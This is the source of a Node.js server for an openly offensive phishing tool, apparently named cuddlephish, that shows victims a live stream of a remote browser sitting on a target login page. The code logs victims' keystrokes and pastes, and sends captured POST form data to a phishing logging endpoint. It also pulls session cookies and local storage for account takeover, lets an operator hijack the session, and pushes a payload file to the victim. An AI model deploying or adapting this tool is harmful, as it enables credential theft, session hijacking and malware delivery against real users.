import fs from 'fs'
import path from 'path'
const __dirname = path.resolve()
import got from 'got'
import Fastify from 'fastify'
import fastify_io from 'fastify-socket.io'
import puppeteer from 'puppeteer-extra'
import StealthPlugin from 'puppeteer-extra-plugin-stealth'
puppeteer.use(StealthPlugin())
import UserAgentOverride from 'puppeteer-extra-plugin-stealth/evasions/user-agent-override/index.js'
import resize_window from './resize_window.js'
import replace from 'stream-replace'
import Xvfb from 'xvfb'
import https from 'https'

//import admin config
const config = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
//import custom target configs
const targets = JSON.parse(fs.readFileSync('./targets.json', 'utf8'));
const target = targets[process.argv[2]]

//set user agent with 'navigator.platform' set to stomp 'Linux'
const ua = UserAgentOverride({ userAgent: config.default_user_agent })
puppeteer.use(ua)

//set up a user data directory if it doesn't exist
try{
  fs.mkdirSync('./user_data')
}catch(err){
  //must exist already. We do it this way to avoid a race condition of checking the existence of the dir before trying to write to it
}

//load pm config if it exists
var pm = undefined
try {
  if (fs.existsSync('./pm.json')) {
    pm= JSON.parse(fs.readFileSync('./pm.json', 'utf8'));
  }
} catch(err) {
  //console.error(err)
}

var ship_logs = function(log_data){
  var headers = {
    'Content-Type': 'application/json',
    'Cookie': pm.admin_cookie
  }
  //send logs off to our phishing server/logging endpoint
  got.post(pm.logging_endpoint , {
    headers: headers,
    https: {rejectUnauthorized: false},
    json: log_data
  }).catch(function(err){
    console.log("Logging Endpoint Failed: " + pm.logging_endpoint)
    console.log("Error:" + err)
    //console.log("Error:" + err.response.body)
    return
  })
}

var nfty_notify = function(notif){
  if(config.nfty_topic == undefined || config.length == 0)
    return

  var options = {
    hostname: 'ntfy.sh',
    port: 443,
    path: '/' + config.nfty_topic,
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': notif.length
    }
  }
  
  var req = https.request(options, (res) => {})
  req.write(notif)
  req.end()
}

const fastify = Fastify({
  logger: false,
  bodyLimit: 19922944
})

//used to set up websockets
fastify.register(fastify_io, {maxHttpBufferSize: 1e11})

//a bucket full of browsers :)
var browsers = []

//make it easy to grab a browser based on attributes like socket_id, or controller_socket, or browser_id etc.
browsers.get = function(attr, val){
  return this.filter(x => x[attr] === val)[0]
}

//keep track of some key active objects
var admins = []

//copy the favicon of the site you want to MitM
fastify.route({
  method: ['GET'],
  url: '/favicon.ico',
  handler: async function (req, reply) {
    let stream = fs.createReadStream(__dirname + "/favicons/" + target.favicon)
    reply.type('image/x-icon').send(stream)
  }
})

//standard victim route
fastify.route({
  method: ['GET'],
  url: '/*',
  handler: async function (req, reply) {
    let client_ip = req.headers['x-real-ip']
    let tracking_id = pm ? pm.tacking_id : 'tracking_id'
    let target_id = req.query[tracking_id] ? req.query[tracking_id] : "unknown"
    if(pm){
      ship_logs({"event_ip": client_ip, "target": target_id, "event_type": "CLICK", "event_data": req.url})
    }
    console.log('client_ip: ' + client_ip)
    nfty_notify('[cuddlephish] Client connected: ' + client_ip)
    //if(config.admin_ips.includes(client_ip)){
      let stream = fs.createReadStream(__dirname + "/cuddlephish.html")
      reply.type('text/html').send(stream.pipe(replace(/PAGE_TITLE/, target.tab_title)).pipe(replace(/CLIENT_IP/, client_ip)).pipe(replace(/TARGET_ID/, target_id)))
    //}else{
    //  reply.type('text/html').send("403")
    //}
  }
})

//route for the headless browser to broadcast a video stream
fastify.route({
  method: ['GET'],
  url: '/broadcast',
  handler: async function (req, reply) {
    let client_ip = req.headers['x-real-ip']
    //only allow requests that have not traversed our HTTP server reverse proxy
    if(client_ip == undefined){
      let stream = fs.createReadStream(__dirname + "/broadcast.html")
      reply.type('text/html').send(stream)
    }else{
      reply.type('text/html').send("403")
    }
  }
})

//admin route
fastify.route({
  method: ['GET'],
  url: '/admin',
  handler: async function (req, reply) {
    let client_ip = req.headers['x-real-ip']
    console.log('admin_ip: ' + client_ip)
    if(config.admin_ips.includes(client_ip)){
      let stream = fs.createReadStream(__dirname + "/admin.html")
      reply.type('text/html').send(stream.pipe(replace(/SOCKET_KEY/, config.socket_key)))
    }else{
      reply.type('text/html').send("403")
    }
  }
})

fastify.route({
  method: ['GET'],
  url: '/FileSaver.min.js',
  handler: async function (req, reply) {
    let stream = fs.createReadStream(__dirname + "/FileSaver.min.js")
    reply.type('text/javascript').send(stream)
  }
})

fastify.route({
  method: ['GET'],
  url: '/switch.js',
  handler: async function (req, reply) {
    let stream = fs.createReadStream(__dirname + "/node_modules/light-switch-bootstrap/switch.js")
    reply.type('text/javascript').send(stream)
  }
})

//Logo
fastify.route({
  method: ['GET'],
  url: '/images/*',
  handler: async function (req, reply) {
    const requestedFile = req.params['*'];
    const filePath = path.join(__dirname, 'favicons', requestedFile);

    // Check if the requested file is within the specified directory
    if (!filePath.startsWith(path.join(__dirname, 'favicons'))) {
      return reply.status(403).send('Forbidden');
    }

    // Check if the file exists before attempting to read it
    if (!fs.existsSync(filePath)) {
      return reply.status(404).send('Not Found');
    }

    // Read and stream the file if it exists
    const stream = fs.createReadStream(filePath);
    reply.type('image/png').send(stream);
  }
})

fastify.route({
  method: ['GET'],
  url: '/jquery.min.js',
  handler: async function (req, reply) {
    let stream = fs.createReadStream(__dirname + "/node_modules/jquery/dist/jquery.min.js")
    reply.type('text/javascript').send(stream)
  }
})

//static .css files
fastify.route({
    method: ['GET'],
    url: '/static/css/*',
    handler: async function (req, reply) {
        const requestedFile = req.params['*'];
        const filePath = path.join(__dirname, '/node_modules/bootstrap/dist/css/', requestedFile);

        // Check if the requested file is within the specified directory
        if (!filePath.startsWith(path.join(__dirname, '/node_modules/bootstrap/dist/css/'))) {
          return reply.status(403).send('Forbidden');
        }

        // Check if the file exists before attempting to read it
        if (!fs.existsSync(filePath)) {
          return reply.status(404).send('Not Found');
        }

        // Read and stream the file if it exists
        const stream = fs.createReadStream(filePath);
        reply.type('text/css').send(stream);
  }
})

//static .js files
fastify.route({
    method: ['GET'],
    url: '/static/js/*',
    handler: async function (req, reply) {
        const requestedFile = req.params['*'];
        const filePath = path.join(__dirname, '/node_modules/bootstrap/dist/js/', requestedFile);

        // Check if the requested file is within the specified directory
        if (!filePath.startsWith(path.join(__dirname, '/node_modules/bootstrap/dist/js/'))) {
          return reply.status(403).send('Forbidden');
        }

        // Check if the file exists before attempting to read it
        if (!fs.existsSync(filePath)) {
          return reply.status(404).send('Not Found');
        }

        // Read and stream the file if it exists
        const stream = fs.createReadStream(filePath);
        reply.type('text/javascript').send(stream);

  }
})

async function get_browser(target_page){
  //use a frame buffer to mimic a screen. Headless browsers can't do WebRTC
  let xvfb = new Xvfb({
    silent: true,
    //xvfb_args: ["-screen", "0", '1280x720x24', "-ac"]
    xvfb_args: ["-screen", "0", '2880x1800x24', "-ac"]
  })
  xvfb.start((err)=>{if (err) console.error(err)})
  let puppet_options = [
    "--ignore-certificate-errors", //ignore sketchy TLS on the target service in case our target org is lazy with their certs
    `--auto-select-desktop-capture-source=${target.tab_title}`, //Allows us to cast WebRTC with answering a prompt of which tab to share :)
    "--disable-blink-features=AutomationControlled",
    "--start-maximized",
    "--no-sandbox",
    `--display=${xvfb._display}`
  ]

  if(config.proxy !== undefined){
    puppet_options.push("--proxy-server=" + config.proxy)
  }
  //set up a unique user data directory for this session so users don't stomp on each others' connections
  //we'll use this same ID to track unique browser instances for socket renegotiations etc. as well
  let browser_id = Math.random().toString(36).slice(2)
  fs.mkdirSync(`./user_data/${browser_id}`)

  let browser = await puppeteer.launch({
    headless: false,
    ignoreHTTPSErrors: true,
    ignoreDefaultArgs: ["--enable-automation"],
    defaultViewport: null,
    userDataDir: `./user_data/${browser_id}`,
    args: puppet_options
  })

  //JS is fun. We can just extend any existing object by defining new attributes and methods on it.
  //We'll add some pieces of data we want to track per browser instance, and a remove instance method while we have this browser's xvfb in local scope
  //remember, callback arguments are evaluated when the callback is defined
  browser.socket_id = ''
  browser.victim_socket = ''
  browser.victim_width = 0
  browser.victim_height = 0
  browser.victim_ip = ''
  browser.victim_target_id = ''
  browser.controller_socket = ''
  browser.keylog = ''
  browser.keylog_file = fs.createWriteStream(`./user_data/${browser_id}/keylog.txt`, {flags:'a'});
  browser.browser_id = browser_id
  browser.target_page = await browser.newPage()
  //browser.target_page.setUserAgent(config.default_user_agent)
  //automatically dismiss alerts etc.
  browser.target_page.on('dialog', async dialog => {
    console.log(dialog.message())
    await dialog.accept()
  })
  browser.target_page.on('request', async request => {
    if(request.method() === 'POST'){
      if(pm && browser.victim_ip != ''){
        let post_url_search = new RegExp(`${pm.post_url_search}`, "i");
        if(post_url_search.test(request.url())){
          ship_logs({"event_ip": browser.victim_ip, "target": browser.victim_target_id, "event_type": "POST_DATA", "event_data": request.postData()})
//          console.log(request.postData())
        }
      }
    }
  })
  browser.remove_instance = async function(){
    xvfb.stop((err)=>{if (err) console.error(err)})
    browser.keylog_file.close()
    const index = browsers.indexOf(browser);
    await browser.close()
    delete browsers[index]
    console.log('killed browser')
  }
  await browser.target_page.goto(target_page, {waitUntil: 'networkidle2'})
  browser.broadcast_page = await browser.newPage()
  browser.broadcast_page.goto(`http://localhost:58082/broadcast?id=${browser_id}`)
  return browser
}

fastify.ready(async function(err){
  if (err) throw err
  var empty_phishbowl = await get_browser(target.login_page)
  fastify.io.use((socket, next) => {
    const token = socket.handshake.auth.token;
    if(token === config.socket_key){
      admins.push(socket.id)
      socket.join('admin_room')
      next()
    }else{
      const browser_id = socket.handshake.query.browserId
      if(browser_id){
        const browser = browsers.get('browser_id', browser_id)
        browser.socket_id = socket.id
      }
      next();
    }
  });
  browsers.push(empty_phishbowl)
  fastify.io.on('connect', function(socket){
    console.info('Socket connected!', socket.id)
    socket.on('new_broadcast', async function(browser_id){
      const browser = browsers.get('browser_id', browser_id)
      browser.socket_id = socket.id
      browser.target_page.on('framenavigated', function(frame){
        if(frame.parentFrame() === null) {
          if(browser.controller_socket !== undefined){
            fastify.io.to(browser.controller_socket).emit('push_state', frame.url().split('/').slice(3).join('/'))
          }
        }
      })
    })
    socket.on('new_phish', async function(viewport_width, viewport_height, client_ip, target_id){
      empty_phishbowl.victim_ip = client_ip
      empty_phishbowl.victim_target_id = target_id
      empty_phishbowl.victim_width = viewport_width
      empty_phishbowl.victim_height = viewport_height
      await resize_window(empty_phishbowl, empty_phishbowl.target_page, viewport_width, viewport_height)
      await empty_phishbowl.target_page.setViewport({width: viewport_width, height: viewport_height})
      empty_phishbowl.victim_socket = socket.id
      //start off this victim with control of the browser instance
      empty_phishbowl.controller_socket = socket.id
      fastify.io.to(empty_phishbowl.socket_id).emit('stream_video_to_first_viewer', socket.id)
      //console.log(empty_phishbowl)
      empty_phishbowl = await get_browser(target.login_page)
      browsers.push(empty_phishbowl)
    })
    socket.on('new_thumbnail', async function(thumbnail){
      const browser = browsers.get('browser_id', thumbnail.browser_id)
      //let viewer_socket = browser.victim_socket
      //fastify.io.to('admin_room').emit('thumbnail', socket.id, viewer_socket, thumbnail.image, browser.keylog)
      fastify.io.to('admin_room').emit('thumbnail', browser.browser_id, thumbnail.image, browser.keylog)
    })
    socket.on('video_stream_offer', async function(viewer_socket_id, offer){
      //forward on to the viewer
      await browsers.get('controller_socket', viewer_socket_id).broadcast_page.bringToFront()
      fastify.io.to(viewer_socket_id).emit('video_stream_offer', socket.id, offer)
      console.log('video_stream_offer')
      console.log('viewer_id: ' + viewer_socket_id)
      console.log('offer: ' + offer)
    })
    socket.on('video_stream_answer', async function(broadcaster_socket_id, answer){
      //forward on to the viewer
      fastify.io.to(broadcaster_socket_id).emit('video_stream_answer', socket.id, answer)
      console.log('video_stream_answer')
      console.log('broadcaster_id: ' + broadcaster_socket_id)
      console.log('answer: ' + answer)
    })
    socket.on("take_over_browser", async function(browser_id, viewport_width, viewport_height){
      //clear the controller if we were just driving another instance
      const prior_takeover_instance = browsers.get('controller_socket', socket.id)
      if(prior_takeover_instance){
        prior_takeover_instance.controller_socket = ''
      }
      const browser = browsers.get('browser_id', browser_id)
      browser.controller_socket = socket.id
      await resize_window(browser, browser.target_page, viewport_width, viewport_height)
      await browser.target_page.setViewport({width: viewport_width, height: viewport_height})
      fastify.io.to(browser.socket_id).emit('stream_to_admin', socket.id)
    })
    socket.on("give_back_control", async function(browser_id){
      //give control back to the victim
      const browser = browsers.get('browser_id', browser_id)
      browser.controller_socket = browser.victim_socket
      await resize_window(browser, browser.target_page, browser.victim_width, browser.victim_height)
      await browser.target_page.setViewport({width: browser.victim_width, height: browser.victim_height})
    })
    socket.on("boot_user", async function(browser_id){
      const browser = browsers.get('browser_id', browser_id)
      console.log("booting user: " + browser.victim_socket)
      fastify.io.to(browser.victim_socket).emit('execute_script', `window.location = "${target.boot_location}";`)
    })
    socket.on("send_payload", async function(browser_id){
      const browser = browsers.get('browser_id', browser_id)
      console.log("sending payload to user: " + browser.victim_socket)
      fastify.io.to(browser.victim_socket).emit('save', {data: fs.readFileSync(__dirname + `/${target.payload}`), filename: `${target.payload}`})
    })
    socket.on("get_cookies", async function(browser_id){
      const browser = browsers.get('browser_id', browser_id)
      let cookie_data = await browser.target_page._client.send('Storage.getCookies')
      let cookies = cookie_data.cookies
      let dom_data = await browser.target_page._client.send('DOMStorage.getDOMStorageItems',{
        storageId: {
          securityOrigin: await browser.target_page.evaluate(() => window.origin),
          isLocalStorage: true,
        },
      })
      let local_storage = dom_data.entries
      fastify.io.to(socket.id).emit('cookie_jar', {cookies: {url: browser.target_page.url(), cookies: cookies, local_storage: local_storage}, browser_id: browser.browser_id})
    })
    socket.on("remove_instance", async function(browser_id){
      const browser = browsers.get('browser_id', browser_id)
      await browser.remove_instance()
      fastify.io.to('admin_room').emit('removed_instance', browser_id)
    })
    socket.on("candidate", async function(peer_socket_id, message){
      console.log('candidate: ' + socket.id + ' to ' + peer_socket_id)
      fastify.io.to(peer_socket_id).emit("candidate", socket.id, message)
    })
    socket.on("go_back", async function(){
      await browsers.get('controller_socket', socket.id).target_page.goBack()
    })
    socket.on("copy", async function(){
      let data = await browsers.get('controller_socket', socket.id).target_page.evaluate("if(window.document.getElementsByTagName('iframe')[0] != undefined){window.document.getElementsByTagName('iframe')[0].contentDocument.getSelection().toString();}else{window.document.getSelection().toString();}")
      fastify.io.to(socket.id).emit("copy_to_clipboard", data)
    })
    socket.on("paste", async function(paste_data){
      const browser = browsers.get('controller_socket', socket.id)
      if(browser){
        if(browser.victim_socket == socket.id){
          console.log(`Paste: ${paste_data}`)
          browser.keylog = browser.keylog + paste_data
          browser.keylog_file.write(paste_data)
          fastify.io.to('admin_room').emit('keylog', socket.id, browser.keylog)
        }
        await browser.target_page.keyboard.type(paste_data)
      }
    })
    socket.on("keydown", async function(key){
      //console.log(`keylog: ${socket.id}: ${key}`)
      const browser = browsers.get('controller_socket', socket.id)
      if(browser){
        //only log if it's the victim typing and not a session after admin takeover
        if(browser.victim_socket == socket.id){
          browser.keylog_file.write(key)
          let current_val = browser.keylog
          let new_val = ''
          if(key == 'Backspace'){
            new_val = current_val?current_val.slice(0,-1):''
          }else if(key == 'Shift'){
            new_val = current_val
          }else if(key == 'Tab'){
            new_val = current_val + '\n'
          }else if(key == 'Enter'){
            new_val = current_val + '\n'
          }else{
            new_val = current_val + key
          }
          browser.keylog = new_val
          fastify.io.to('admin_room').emit('keylog', browser.browser_id, new_val)
        }
        const istext = key.length === 1 ? true: false;
        if(istext){
          await browser.target_page._client.send('Input.dispatchKeyEvent', {
            type: 'keyDown',
            key: key,
            text: key,
          })
        }else if (key != 'Dead'){
          await browser.target_page.keyboard.down(key)
        }
      }
    })
    socket.on("keyup", async function(key){
      const browser = browsers.get('controller_socket', socket.id)
      if(browser){
        const istext = key.length === 1 ? true: false;
        if(istext){
          await browser.target_page._client.send('Input.dispatchKeyEvent', {
            type: 'keyUp',
            key: key,
            text: key,
          })
        }else if(key != 'Dead'){
          await browser.target_page.keyboard.up(key)
        }
      }
    })
    socket.on("mouse_event", async function(mouse_event){
      const browser = browsers.get('controller_socket', socket.id)
      if(browser){
        if(mouse_event.type === "click"){
          await browser.target_page.mouse.move(mouse_event.clientX, mouse_event.clientY)
        }else if(mouse_event.type === "mousewheel"){
          browser.target_page.mouse.wheel({"deltaX": mouse_event.wheelDeltaX})
          browser.target_page.mouse.wheel({"deltaY": mouse_event.wheelDeltaY})
        }else if(mouse_event.type === "mousedown"){
          await browser.target_page.mouse.down(mouse_event.clientX, mouse_event.clientY)
        }else if(mouse_event.type === "mouseup"){
          await browser.target_page.mouse.up(mouse_event.clientX, mouse_event.clientY)
        }else if(mouse_event.type === "mousemove"){
          await browser.target_page.mouse.move(mouse_event.clientX, mouse_event.clientY)
        }
      }else{
        //console.log("rogue viewer")
      }
    })
  })
})

// Run the server!
const start = async () => {
  fastify.listen(58082, '0.0.0.0', (err) => {
    if (err) {
      fastify.log.error(err)
      process.exit(1)
    }
    fastify.log.info(`fastify listening on ${fastify.server.address().port}`)
  })
}
start()
